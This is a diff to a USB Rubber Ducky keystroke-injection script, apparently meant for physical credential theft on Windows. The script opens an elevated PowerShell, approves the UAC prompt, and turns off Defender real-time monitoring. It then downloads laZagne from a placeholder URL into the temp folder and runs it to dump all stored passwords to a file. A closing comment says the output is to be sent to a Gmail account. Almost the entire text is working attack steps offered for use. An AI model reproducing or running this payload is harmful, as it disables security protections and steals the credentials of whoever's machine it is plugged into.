@@ -1,16 +1,34 @@
+REM Killing Windows Powershell
 DELAY 2000
 GUI r
 DELAY 200
 STRING powershell Start-Process powershell -Verb runAs
 ENTER
-DELAY 1000
+DELAY 650
 ALT y
-DELAY 200
+ENTER
+DELAY 800
 STRING Set-MpPreference -DisableRealtimeMonitoring $true
 ENTER
+DELAY 100
+REM Downloading and Executing laZagne
 STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('http://url to laZagne','%TEMP%\laZagne.exe');}
 ENTER
-DELAY 8000
+DELAY 7500
+STRING exit
+ENTER
+DELAY 50
+GUI r
+DELAY 200
+STRING cmd
+DELAY 100
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+ENTER
+DELAY 500
 STRING %TEMP%\laZagne.exe all -oN > c:\%COMPUTERNAME%_%USERPROFILE%-output.txt
 ENTER
-DELAY
+DELAY 1000
+REM Sending file to your Gmail Account
+ 
